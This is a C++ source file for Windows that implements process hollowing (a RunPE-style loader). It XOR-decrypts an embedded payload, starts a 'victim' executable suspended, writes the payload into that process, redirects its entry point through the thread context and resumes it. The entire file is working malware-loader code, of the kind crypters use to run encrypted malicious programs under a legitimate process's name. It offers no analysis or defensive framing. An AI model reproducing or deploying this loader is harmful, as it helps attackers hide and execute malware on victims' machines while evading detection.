#include <iostream>  // Standard C++ library for console I/O
#include <Windows.h> // WinAPI Header
#include <fstream>   // File manipulation
#include "Res_crm.h" // Resource to run in memory

#define RELOC_32BIT_FIELD 3

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY;

// Use this if you want to read the executable from disk
HANDLE MapFileToMemory(LPCSTR filename)
{
	std::streampos size;
	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
	if (file.is_open())
	{
		size = file.tellg();

		char* Memblock = new char[size]();

		file.seekg(0, std::ios::beg);
		file.read(Memblock, size);
		file.close();

		return Memblock;
	}
	return 0;
}

bool OperationSuccessful(DWORD operation, const char* name)
{
	DWORD dw = 0;
	if (!operation)
	{
		dw = GetLastError();
		std::cout << "----------------------------------" << std::endl;
		if (name == "VirtualAllocEx") printf("Fail to allocate memory at 0x%.8X.\n", (int)operation);
		std::cout << "operation: " << name << std::endl;
		std::cout << "error:     " << dw << std::endl;
		std::cout << "----------------------------------" << std::endl;
	}
	return dw == 0;
}

bool ProcessIs32bit(PROCESS_INFORMATION* PI, char* filePath)
{
	BOOL is32 = FALSE;
	IsWow64Process(PI->hProcess, &is32);
	if (is32 == FALSE)
	{
		printf("selected target (%s) is 64 bit app.\n", filePath);
		printf("exiting the program...\n");
		TerminateProcess(PI->hProcess, 1);
		return false;
	}
	return true;
}

ULONGLONG get_va_offset_delta(void* Image, IMAGE_DOS_HEADER* DOSHeader, IMAGE_NT_HEADERS* NtHeader, DWORD VA)
{
	IMAGE_SECTION_HEADER* SectionHeader;
	ULONGLONG delta = 0;
	for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
	{
		SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
		if (SectionHeader->VirtualAddress <= VA
			&& SectionHeader->VirtualAddress + SectionHeader->SizeOfRawData > VA)
		{
			delta = SectionHeader->VirtualAddress - SectionHeader->PointerToRawData;
			break;
		}
	}

	return delta;
}

bool apply_reloc_block32(void* Image, IMAGE_DOS_HEADER* DOSHeader, IMAGE_NT_HEADERS* NtHeader,
	BASE_RELOCATION_ENTRY* block, SIZE_T entriesNum, DWORD page, ULONGLONG oldBase, ULONGLONG newBase, PVOID modulePtr)
{
	int delta = get_va_offset_delta(Image, DOSHeader, NtHeader, page);
	BASE_RELOCATION_ENTRY* entry = block;
	SIZE_T i = 0;
	for (i = 0; i < entriesNum; i++) {
		DWORD offset = entry->Offset;
		DWORD type = entry->Type;
		if (entry == NULL || type == 0) {
			break;
		}
		if (type != RELOC_32BIT_FIELD) {
			printf("--------------------\n");
			printf("Not supported relocations format at %d: %d\n", static_cast<int>(i), type);
			printf("--------------------\n");
			return false;
		}
		DWORD* relocateAddr = (DWORD*)((ULONG_PTR)modulePtr + (page - delta) + offset);
		(*relocateAddr) = static_cast<DWORD>((*relocateAddr) - (ULONG_PTR)oldBase) + newBase;
		entry = (BASE_RELOCATION_ENTRY*)((ULONG_PTR)entry + sizeof(WORD));
	}
	printf("[+] Applied %d relocations\n", static_cast<int>(i));
	return true;
}

bool apply_relocations(void* Image, IMAGE_DOS_HEADER* DOSHeader, IMAGE_NT_HEADERS* NtHeader,
	ULONGLONG newBase, ULONGLONG oldBase, IMAGE_DATA_DIRECTORY* relocDir)
{
	DWORD maxSize = relocDir->Size;
	DWORD relocAddr = relocDir->VirtualAddress;
	ULONGLONG delta = get_va_offset_delta(Image, DOSHeader, NtHeader, relocAddr);
	DWORD relocOffset = relocAddr - delta;

	IMAGE_BASE_RELOCATION* reloc = NULL;
	NtHeader->OptionalHeader.ImageBase = static_cast<DWORD>((ULONGLONG)newBase);
	DWORD parsedSize = 0;
	while (parsedSize < maxSize) {
		reloc = (IMAGE_BASE_RELOCATION*)(relocOffset + parsedSize + (ULONG_PTR)Image);
		parsedSize += reloc->SizeOfBlock;

		if (reloc->VirtualAddress == NULL || reloc->SizeOfBlock == 0) {
			continue;
		}

		printf("RelocBlock: %x %x\n", reloc->VirtualAddress, reloc->SizeOfBlock);

		size_t entriesNum = (reloc->SizeOfBlock - 2 * sizeof(DWORD)) / sizeof(WORD);
		DWORD page = reloc->VirtualAddress;

		BASE_RELOCATION_ENTRY* block = (BASE_RELOCATION_ENTRY*)((ULONG_PTR)reloc + sizeof(DWORD) + sizeof(DWORD));
		if (apply_reloc_block32(Image, DOSHeader, NtHeader, block, entriesNum, page, oldBase, newBase, Image) == false) {
			return false;
		}
	}
	return true;
}

int RunPortableExecutable(void* Image, char* hollowedPath, bool dbg)
{
	bool operationResult = 0;
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX = new CONTEXT;

	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize
	IMAGE_DATA_DIRECTORY* relocDir = &(NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);

	if (hollowedPath)
	{
		strcpy_s(CurrentFilePath, hollowedPath); // path from cl argument
	}
	else
	{
		OperationSuccessful(GetModuleFileNameA(0, CurrentFilePath, 1024), "GetModuleFileNameA"); // Path to current executable
	}

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		operationResult = CreateProcessA(CurrentFilePath, NULL, NULL, NULL, // Create a new instance of process
			FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI); // in suspended state, for the new image.
		OperationSuccessful(operationResult, "CreateProcessA");

		if (ProcessIs32bit(&PI, CurrentFilePath) == FALSE) return 1; // 64 bit processes are not supported 


		if (operationResult)
		{
			// Allocate memory for the context.
			CTX->ContextFlags = CONTEXT_INTEGER;

			operationResult = GetThreadContext(PI.hThread, LPCONTEXT(CTX));
			OperationSuccessful(operationResult, "GetThreadContext");
			if (operationResult) // If context is in thread
			{
				bool relocatable = relocDir->VirtualAddress && relocDir->Size;
				DWORD prot = PAGE_READWRITE;
				LPVOID allocBase = relocatable ? NULL : LPVOID(NtHeader->OptionalHeader.ImageBase);

				pImageBase = VirtualAllocEx(PI.hProcess, allocBase, NtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, prot);
				
				auto val = (int*)pImageBase;
				if (!OperationSuccessful((DWORD)pImageBase, "VirtualAllocEx") || !pImageBase)
				{
					TerminateProcess(PI.hProcess, 1);
					return 1;
				}

				if (relocatable) // Apply relocations from .reloc section
				{
					apply_relocations(Image, DOSHeader, NtHeader, (ULONGLONG)pImageBase, NtHeader->OptionalHeader.ImageBase, relocDir);
				}
				operationResult = WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
				OperationSuccessful(operationResult, "WriteProcessMemory1");

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					operationResult = WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					OperationSuccessful(operationResult, "WriteProcessMemory2");
				}
				
				operationResult = WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), &pImageBase, 4, 0);
				OperationSuccessful(operationResult, "WriteProcessMemory3");

				LPVOID eaxaddr = LPVOID(CTX->Eax);
				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				// Set the context
				OperationSuccessful(SetThreadContext(PI.hThread, LPCONTEXT(CTX)), "SetThreadContext"); 
				// Set mem page as execute
				VirtualProtectEx(PI.hProcess, pImageBase, NtHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &prot);
				//Resume the process
				operationResult = ResumeThread(PI.hThread) != -1; 
				OperationSuccessful(operationResult, "ResumeThread");

				delete CTX;
				return 0;
			}
		}
	}
	
	return 1;
}

int main(int argc, char** argv)
{
	char* hollowed = NULL;
	if (argc > 1) hollowed = argv[1]; // Takes the path to the victim PE as an argument
	bool dbg = false;

	unsigned char* cryptedRes = crmRes;
	unsigned int dataSz = sizeof(crmRes);
	unsigned char* key = crmKey;
	unsigned int keySz = sizeof(crmKey);
	unsigned char* res = new unsigned char[dataSz];
	
	for (int i = 0; i < dataSz; i++)
	{
		res[i] = cryptedRes[i] ^ key[i % keySz];
	}

	RunPortableExecutable((HANDLE)res, hollowed, dbg);
	std::cout << "\nPress Enter to close console." << std::endl;
	std::cin.ignore();
}